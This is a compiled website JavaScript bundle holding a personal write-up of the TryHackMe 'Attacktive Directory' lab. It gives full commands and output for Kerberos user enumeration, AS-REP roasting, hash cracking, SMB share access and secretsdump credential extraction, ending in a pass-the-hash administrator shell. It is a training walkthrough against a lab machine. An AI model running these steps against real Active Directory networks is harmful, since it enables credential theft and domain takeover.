"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3799],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return m}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),c=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=c(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(n),m=r,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return n?a.createElement(h,s(s({ref:t},p),{},{components:n})):a.createElement(h,s({ref:t},p))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i.mdxType="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=n[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},3049:function(e,t,n){n.r(t),n.d(t,{assets:function(){return l},contentTitle:function(){return s},default:function(){return u},frontMatter:function(){return o},metadata:function(){return i},toc:function(){return c}});var a=n(3117),r=(n(7294),n(3905));const o={},s=void 0,i={unversionedId:"Cibersecurity/Red Team/Writeups/Atackive directory THM{}",id:"Cibersecurity/Red Team/Writeups/Atackive directory THM{}",title:"Atackive directory THM{}",description:"Setup",source:"@site/docs/Cibersecurity/Red Team/Writeups/Atackive directory THM{}.md",sourceDirName:"Cibersecurity/Red Team/Writeups",slug:"/Cibersecurity/Red Team/Writeups/Atackive directory THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Atackive directory THM{}",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Archetype THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Archetype THM{}"},next:{title:"Daily Bugle THM{}",permalink:"/docs/Cibersecurity/Red Team/Writeups/Daily Bugle THM{}"}},l={},c=[{value:"Setup",id:"setup",level:2},{value:"Installing Impacket",id:"installing-impacket",level:3},{value:"Installing Bloodhound and Neo4j",id:"installing-bloodhound-and-neo4j",level:3},{value:"Process",id:"process",level:2}],p={toc:c};function u(e){let{components:t,...n}=e;return(0,r.kt)("wrapper",(0,a.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"setup"},"Setup"),(0,r.kt)("h3",{id:"installing-impacket"},"Installing Impacket"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket\npip3 install -r /opt/impacket/requirements.txt\ncd /opt/impacket/ && python3 ./setup.py install\n")),(0,r.kt)("h3",{id:"installing-bloodhound-and-neo4j"},"Installing Bloodhound and Neo4j"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"apt install bloodhound neo4j\n")),(0,r.kt)("h2",{id:"process"},"Process"),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"Enumerate with Nmap")),(0,r.kt)("p",null,"We obtain this useful information. The full AD domain is spookysec.local."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"88/tcp   open  kerberos-sec  Microsoft Windows Kerberos\n\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n|_ssl-date: 2022-03-04T09:53:32+00:00; 0s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: THM-AD\n|   NetBIOS_Domain_Name: THM-AD\n|   NetBIOS_Computer_Name: ATTACKTIVEDIREC\n|   DNS_Domain_Name: spookysec.local\n|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-03-04T09:53:25+00:00\n")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Enumerate 139/445 with enum4linux")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"enum4linux -a <IP>\n")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"Enumerating Users via Kerberos\nKerberos is a key authentication service within Active Directory and with the port 88 opened, we can use a tool called ",(0,r.kt)("strong",{parentName:"li"},"Kerbrute")," to bruteforce discovery of users, password and even password spray.\nTo install kerbrute, visit: ",(0,r.kt)("a",{parentName:"li",href:"https://bhichher.medium.com/user-enumeration-using-kerbrute-tool-5154a252f6a4"},"https://bhichher.medium.com/user-enumeration-using-kerbrute-tool-5154a252f6a4"))),(0,r.kt)("p",null,"To enumerate usernames, it is compulsory to indicate de domain. As we know, if we just use ",(0,r.kt)("inlineCode",{parentName:"p"},"spookysec.local")," kali wont know the IP. So, we have to add it to the ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/hosts")," file."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"./kerbrute userenum --dc spookysec.local -d spookysec.local /home/kali/THM/wind/userlist.txt -t 100\n\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (n/a) - 03/05/22 - Ronnie Flathers @ropnop\n\n2022/03/05 03:47:14 >  Using KDC(s):\n2022/03/05 03:47:14 >   spookysec.local:88\n\n2022/03/05 03:47:14 >  [+] VALID USERNAME:       james@spookysec.local\n2022/03/05 03:47:14 >  [+] VALID USERNAME:       svc-admin@spookysec.local\n2022/03/05 03:47:15 >  [+] VALID USERNAME:       James@spookysec.local\n2022/03/05 03:47:15 >  [+] VALID USERNAME:       robin@spookysec.local\n2022/03/05 03:47:16 >  [+] VALID USERNAME:       darkstar@spookysec.local\n2022/03/05 03:47:16 >  [+] VALID USERNAME:       administrator@spookysec.local\n2022/03/05 03:47:18 >  [+] VALID USERNAME:       backup@spookysec.local\n2022/03/05 03:47:18 >  [+] VALID USERNAME:       paradox@spookysec.local\n2022/03/05 03:47:22 >  [+] VALID USERNAME:       JAMES@spookysec.local\n2022/03/05 03:47:23 >  [+] VALID USERNAME:       Robin@spookysec.local\n2022/03/05 03:47:30 >  [+] VALID USERNAME:       Administrator@spookysec.local\n2022/03/05 03:47:44 >  [+] VALID USERNAME:       Darkstar@spookysec.local\n2022/03/05 03:47:49 >  [+] VALID USERNAME:       Paradox@spookysec.local\n2022/03/05 03:48:05 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local\n2022/03/05 03:48:10 >  [+] VALID USERNAME:       ori@spookysec.local\n2022/03/05 03:48:19 >  [+] VALID USERNAME:       ROBIN@spookysec.local\n")),(0,r.kt)("ol",{start:3},(0,r.kt)("li",{parentName:"ol"},"ASREPRoasting Attack\nFirst, we will use GetNPUsers.py from Impacket to retrieve kerberos ticket and try to decrypt it   ")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sudo find / -type f -name 'GetNPUsers.py'\n\npython3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py spookysec.local/svc-admin -no-pass\n[*] Getting TGT for svc-admin\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:57b172a9aa785d8252a3509e7208d175$df011d8e21e10b0781783c9f625bc1b61cfed91037e4db5912f5eeba300401154a276108d3c12c364b1ed42e7c4243dd1607ed2a2a5ac5b47d1c586511d7a3a71b0e62aec0719b6fe4a12a7568f1aa1d491e07a8a46c40e65159565d655ff33c33a0d305d8a177272fb9d37811bd39942a764b4247f990878d62a2d85e82f08bf84332c531c4be2c90ab970bba9d0edbaf1ffbdb347d82b675c3ee2a55b2ec65f9e39b06acf502364aa3fe45751b8cefb6cbb0ad583e97bef5d4fa48ed61af5f468b1b8dbc277329e1fc2e53f9d84f4696b7907fe77a31d40dc4025e95a7346988ab487efbf711ac967bda862e9fecd0d922\n")),(0,r.kt)("p",null,"After that, we identify using the hashcat list, that the mode is 18200 in order to crack it."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"john svc-adminhash --wordlist=/usr/share/wordlists/rockyou.txt\n\n# management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)\n")),(0,r.kt)("ol",{start:4},(0,r.kt)("li",{parentName:"ol"},"Now that we have user's account credentials, we can attempt to enumerate any shares. For that, we will be using ",(0,r.kt)("strong",{parentName:"li"},"smbclient"))),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"smbclient -U=svc-admin%management2005 -L //10.10.251.19  \n\nSharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        backup          Disk      \n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share\n")),(0,r.kt)("p",null,"Now we test the access to the different shares:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"smbclient -U=svc-admin%management2005 //10.10.251.19/backup\n\nsmb: \\> dir\n  .                                   D        0  Sat Apr  4 15:08:39 2020\n  ..                                  D        0  Sat Apr  4 15:08:39 2020\n  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020\n")),(0,r.kt)("p",null,"That one in particular, show as a txt. After downloading it and decoding, this info is obtained:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"backup@spookysec.local:backup2517860\n")),(0,r.kt)("ol",{start:5},(0,r.kt)("li",{parentName:"ol"},"Elevating Privileges within the Domain\nNow we use the credentials and connect through RDP")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"xfreerdp /v:10.10.251.19 /u:backup /p:backup2517860\n")),(0,r.kt)("p",null,"This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes. How do we know that?"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'1. Open Active Directory Users and Computers.\n2. From the View menu, select Advanced Features.\n3. Right-click the domain object and select Properties.\n4. Click the Security tab.\n5. Select the backup username and go to "Replicant Directory Changes All"\n')),(0,r.kt)("p",null,'Due to that, we can use another tool within Impacket called "secretsdump.py" that will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.'),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"sudo find / -type f -name 'secretsdump.py'\n\n# usr/share/doc/python3-impacket/examples/secretsdump.py\n")),(0,r.kt)("p",null,"Now we use secretsdump.py"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py backup:backup2517860@spookysec.local\n\n# [*] Using the DRSUAPI method to get NTDS.DIT secrets\n# Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::\n")),(0,r.kt)("p",null,"One of the hashes we obtained is from the administration account, so now we can use a ",(0,r.kt)("em",{parentName:"p"},"pass the hash")," method to authenticate as the user without the password."),(0,r.kt)("ol",{start:6},(0,r.kt)("li",{parentName:"ol"},"Pass the hash\nNow we are gonna use Evil-WinRM. To install it:")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"Method 2. Git clone and install dependencies on your system manually\n\n    Step 1. Install dependencies manually: sudo gem install winrm winrm-fs stringio logger fileutils\n    Step 2. Clone the repo: git clone https://github.com/Hackplayers/evil-winrm.git\n    Step 3. Ready. Just launch it!\n\ncd evil-winrm && ruby evil-winrm.rb -i 10.10.169.166 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc\n\n\n# Evil-WinRM shell v3.3\n\n# Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\n# Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\n# Info: Establishing connection to remote endpoint\n\n# *Evil-WinRM* PS C:\\Users\\Administrator\\Documents>\n")),(0,r.kt)("p",null,"And we obtain the flags from the desktop folders: svc-admin trhough the cracked password (obtained with kerbrute and GetNPUsers.py), backup through the smb obtained txt file credentials and Administrator through Pass The Hass."))}u.isMDXComponent=!0}}]);